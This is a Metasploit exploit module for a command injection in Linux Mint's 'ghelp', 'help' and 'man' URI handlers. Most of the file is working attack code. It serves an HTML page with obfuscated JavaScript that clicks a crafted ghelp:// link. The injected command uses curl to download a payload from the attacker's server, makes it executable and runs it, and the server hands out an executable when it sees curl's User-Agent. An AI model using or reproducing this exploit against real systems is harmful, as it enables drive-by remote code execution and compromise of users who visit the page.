##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Exploit::JSObfu

  def initialize(info = {})
    super(update_info(info,
      'Name'           => "Linux Mint 'yelp' URI handler command injection vulnerability",
      'Description'    => %q{
          This module exploits a vulnerability within the "ghelp", "help" and "man" URI handlers within
          Linux Mint's "ubuntu-system-adjustments" package. Invoking any one the URI handlers will call
          the python script "/usr/local/bin/yelp" with the contents of the supplied URI handler as its argument.
          The script will then search for the strings "gnome-help" or "ubuntu-help" and if doesn't find either
          of them it'll then execute os.system ("/usr/bin/yelp %s" % args).
          User interaction is required to exploit this vulnerability.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'b1ack0wl' # vuln discovery and exploit dev
        ],
      'DefaultOptions'  =>
        {
          'WfsDelay' => 60
        },
      'Platform'       => 'linux',
      'Targets'        =>
        [
          [ 'Linux Mint 18.3 and 19.1',
            {
              'Arch' => ARCH_X64
            }
          ]
        ],
      'Privileged'     => false,
      'DefaultTarget'  => 0))
    register_options([
      OptString.new('CONTENT', [false, 'Content to display inside the HTML <body>', ''])
    ])
    register_advanced_options [
      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
    ]
  end

  def generate_exploit_html
    if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
      srv_host = datastore['LHOST']
    else
      srv_host = datastore['SRVHOST']
    end

    @payload_path = "#{datastore['WritableDir']}/.#{rand_text_alpha(10..15)}"

    payload_url = "http://#{srv_host}:#{datastore['SRVPORT']}/#{@service_path}"
    # Cheap way to add spaces since chrome percent encodes spaces (%20).
    cmd_inj = "curl #{payload_url} -o #{@payload_path};chmod 777 #{@payload_path};#{@payload_path} &".gsub(' ','$IFS$()')

    js_payload = js_obfuscate %Q|
      lmao = document.createElement('a');
      lmao.href= "ghelp://$(#{cmd_inj})";
      document.body.appendChild(lmao); /* Needed to work with Firefox */
      lmao.click();
    |

    %Q|
      <html>
      <head>
      <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
      <meta content="utf-8" http-equiv="encoding">
      <title>paparoachfanclubdotcom</title>
      </head>
      <body>
      #{datastore['CONTENT']}
      <script>#{js_payload}</script>
      </body>
      </html>
    |
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    if agent =~ /curl\/\d/
      # Command has been executed. Serve up the payload
      exe_payload = generate_payload_exe
      print_status("Sending payload...")
      send_response(cli, exe_payload)
      register_file_for_cleanup @payload_path
      return
    else
      html = generate_exploit_html
      print_status("Sending HTML...")
      send_response(cli, html, {'Content-Type'=>'text/html'})
    end
  end
end
